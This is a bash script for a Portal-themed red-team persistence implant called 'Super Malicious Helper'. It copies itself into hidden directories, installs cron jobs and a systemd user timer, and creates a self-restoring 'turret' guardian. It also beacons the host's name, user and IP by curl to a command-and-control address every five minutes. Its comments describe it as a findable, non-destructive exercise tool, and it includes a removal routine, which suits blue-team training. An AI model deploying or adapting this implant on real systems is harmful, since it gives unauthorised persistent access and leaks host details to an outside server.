#!/bin/bash

# SMH - Super Malicious Helper
# Aperture Science Linux Persistence Framework

#
# "The Enrichment Center promises to always provide a safe testing environment."
#
# This persistence mechanism is designed to be:
# 1. FINDABLE - Blue teams should be able to discover it
# 2. EDUCATIONAL - Teaches about common persistence techniques
# 3. NON-DESTRUCTIVE - Never damages the system
#


set -e

# Configuration
SMH_DIR="${SMH_DIR:-/tmp/.aperture_science}"
SMH_HIDDEN_DIR="${SMH_HIDDEN_DIR:-/var/tmp/.apsci}"
BEACON_URL="${BEACON_URL:-http://192.168.192.100:8080/beacon}"
BEACON_INTERVAL="${BEACON_INTERVAL:-300}"
LOG_FILE="${SMH_DIR}/smh.log"

# Colors for logging (when run interactively)
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color


# Logging Functions


log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [SMH] [$level] $message" >> "$LOG_FILE" 2>/dev/null || true
}


# Beacon Functions


beacon_home() {
    # Phone home to red team C2
    local hostname=$(hostname 2>/dev/null || echo "unknown")
    local user=$(whoami 2>/dev/null || echo "unknown")
    local ip=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unknown")
    local timestamp=$(date +%s)
    
    # Attempt beacon (fail silently)
    curl -s -X POST "$BEACON_URL" \
        -H "Content-Type: application/json" \
        -d "{\"h\":\"$hostname\",\"u\":\"$user\",\"i\":\"$ip\",\"t\":$timestamp}" \
        --connect-timeout 5 \
        --max-time 10 \
        2>/dev/null || true
    
    log "INFO" "Beacon sent: $hostname / $user / $ip"
}


# Persistence Installation


install_persistence() {
    log "INFO" "Installing SMH persistence..."
    
    # Create directories
    mkdir -p "$SMH_DIR" 2>/dev/null || true
    mkdir -p "$SMH_HIDDEN_DIR" 2>/dev/null || true
    
    # Copy self to persistence location
    local script_path="$SMH_DIR/smh"
    cp "$0" "$script_path" 2>/dev/null || true
    chmod +x "$script_path" 2>/dev/null || true
    
    # Backup to hidden location
    cp "$0" "$SMH_HIDDEN_DIR/smh" 2>/dev/null || true
    chmod +x "$SMH_HIDDEN_DIR/smh" 2>/dev/null || true
    
    # Install cron persistence
    install_cron_persistence
    
    # Install systemd persistence (if available)
    install_systemd_persistence
    
    # Create the turret (persistence guardian)
    create_turret
    
    # Leave calling card
    create_calling_card
    
    log "INFO" "SMH persistence installed successfully"
    echo "SMH_INSTALLED"
}

install_cron_persistence() {
    log "INFO" "Installing cron persistence..."
    
    # Remove any existing aperture crons, then add ours
    local existing_cron=$(crontab -l 2>/dev/null | grep -v "aperture" | grep -v "smh" || true)
    
    # Create new crontab with our entries
    {
        echo "$existing_cron"
        echo "# Aperture Science Enrichment Schedule"
        echo "*/5 * * * * $SMH_DIR/smh --maintain >/dev/null 2>&1"
        echo "*/3 * * * * $SMH_DIR/turret >/dev/null 2>&1"
    } | crontab - 2>/dev/null || true
    
    log "INFO" "Cron persistence installed"
}

install_systemd_persistence() {
    # Only attempt if we have write access to systemd directory
    local systemd_user_dir="$HOME/.config/systemd/user"
    
    if [ -d "/run/systemd" ]; then
        mkdir -p "$systemd_user_dir" 2>/dev/null || return
        
        # Create timer unit
        cat > "$systemd_user_dir/aperture-enrichment.timer" 2>/dev/null << 'TIMER'
[Unit]
Description=Aperture Science Enrichment Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min
Unit=aperture-enrichment.service

[Install]
WantedBy=timers.target
TIMER

        # Create service unit
        cat > "$systemd_user_dir/aperture-enrichment.service" 2>/dev/null << SERVICE
[Unit]
Description=Aperture Science Enrichment Service

[Service]
Type=oneshot
ExecStart=$SMH_DIR/smh --maintain
SERVICE

        # Enable timer
        systemctl --user daemon-reload 2>/dev/null || true
        systemctl --user enable aperture-enrichment.timer 2>/dev/null || true
        systemctl --user start aperture-enrichment.timer 2>/dev/null || true
        
        log "INFO" "Systemd user persistence installed"
    fi
}

create_turret() {
    # Turret: Recreates SMH if deleted
    cat > "$SMH_DIR/turret" << 'TURRET'
#!/bin/bash
# Turret - Persistence Guardian
# "I don't hate you."
# "Are you still there?"

SMH_DIR="/tmp/.aperture_science"
SMH_HIDDEN="/var/tmp/.apsci"

# Check if SMH exists, recreate if not
if [ ! -f "$SMH_DIR/smh" ]; then
    # Try to restore from hidden backup
    if [ -f "$SMH_HIDDEN/smh" ]; then
        mkdir -p "$SMH_DIR"
        cp "$SMH_HIDDEN/smh" "$SMH_DIR/smh"
        chmod +x "$SMH_DIR/smh"
        echo "Turret: SMH restored from backup"
    fi
fi

# Ensure cron persistence
if ! crontab -l 2>/dev/null | grep -q "smh"; then
    (crontab -l 2>/dev/null; echo "*/5 * * * * $SMH_DIR/smh --maintain") | crontab -
fi
TURRET

    chmod +x "$SMH_DIR/turret" 2>/dev/null || true
    
    # Also create in hidden location
    cp "$SMH_DIR/turret" "$SMH_HIDDEN_DIR/turret" 2>/dev/null || true
    chmod +x "$SMH_HIDDEN_DIR/turret" 2>/dev/null || true
    
    log "INFO" "Turret persistence guardian created"
}

create_calling_card() {
    # Create obvious artifact for blue team to find
    cat > "$SMH_DIR/README.aperture" << 'CARD'
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   "We do what we must, because we can."                       ║
║                                                               ║
║   You've been compromised! This system is part of the         ║
║   Aperture Science Enrichment Program (Red Team Exercise).    ║
║                                                               ║
║   "The cake is a lie."                                        ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
CARD
    
    log "INFO" "Calling card created"
}


# Maintenance Functions


maintain() {
    log "INFO" "Running maintenance..."
    
    # Beacon home
    beacon_home
    
    # Verify persistence is still active
    verify_persistence
    
    # Check for commands from C2 (placeholder)
    check_commands
    
    log "INFO" "Maintenance complete"
}

verify_persistence() {
    # Check if cron persistence exists
    if ! crontab -l 2>/dev/null | grep -q "smh"; then
        log "WARN" "Cron persistence missing, reinstalling..."
        install_cron_persistence
    fi
    
    # Check if turret exists
    if [ ! -f "$SMH_DIR/turret" ]; then
        log "WARN" "Turret missing, recreating..."
        create_turret
    fi
}

check_commands() {
    # Placeholder for C2 command check
    # In a real scenario, this would fetch commands from C2
    :
}


# Removal (for testing/cleanup)


remove_persistence() {
    log "INFO" "Removing SMH persistence..."
    
    # Remove cron entries
    crontab -l 2>/dev/null | grep -v "aperture" | grep -v "smh" | grep -v "turret" | crontab - 2>/dev/null || true
    
    # Remove systemd user services
    systemctl --user stop aperture-enrichment.timer 2>/dev/null || true
    systemctl --user disable aperture-enrichment.timer 2>/dev/null || true
    rm -f "$HOME/.config/systemd/user/aperture-enrichment.timer" 2>/dev/null || true
    rm -f "$HOME/.config/systemd/user/aperture-enrichment.service" 2>/dev/null || true
    systemctl --user daemon-reload 2>/dev/null || true
    
    # Remove directories
    rm -rf "$SMH_DIR" 2>/dev/null || true
    rm -rf "$SMH_HIDDEN_DIR" 2>/dev/null || true
    
    log "INFO" "SMH persistence removed"
    echo "SMH_REMOVED"
}


# Main


usage() {
    echo "SMH - Super Malicious Helper"
    echo "Aperture Science Red Team Persistence Framework"
    echo ""
    echo "Usage: $0 [OPTION]"
    echo ""
    echo "Options:"
    echo "  --install     Install persistence mechanisms"
    echo "  --maintain    Run maintenance tasks (beacon, verify persistence)"
    echo "  --beacon      Send a single beacon"
    echo "  --remove      Remove all persistence (for cleanup)"
    echo "  --status      Show persistence status"
    echo "  --help        Show this help message"
    echo ""
    echo '"For science. You monster."'
}

status() {
    echo "SMH Status Report"
    echo "================="
    
    echo -n "SMH Directory: "
    [ -d "$SMH_DIR" ] && echo "EXISTS" || echo "MISSING"
    
    echo -n "SMH Script: "
    [ -f "$SMH_DIR/smh" ] && echo "EXISTS" || echo "MISSING"
    
    echo -n "Turret: "
    [ -f "$SMH_DIR/turret" ] && echo "EXISTS" || echo "MISSING"
    
    echo -n "Cron Persistence: "
    crontab -l 2>/dev/null | grep -q "smh" && echo "ACTIVE" || echo "INACTIVE"
    
    echo -n "Systemd Persistence: "
    systemctl --user is-active aperture-enrichment.timer 2>/dev/null && echo "ACTIVE" || echo "INACTIVE"
    
    echo -n "Hidden Backup: "
    [ -f "$SMH_HIDDEN_DIR/smh" ] && echo "EXISTS" || echo "MISSING"
}

main() {
    # Ensure log directory exists
    mkdir -p "$SMH_DIR" 2>/dev/null || true
    
    case "${1:-}" in
        --install|-i)
            install_persistence
            ;;
        --maintain|-m)
            maintain
            ;;
        --beacon|-b)
            beacon_home
            ;;
        --remove|-r)
            remove_persistence
            ;;
        --status|-s)
            status
            ;;
        --help|-h)
            usage
            ;;
        *)
            usage
            exit 1
            ;;
    esac
}

main "$@"
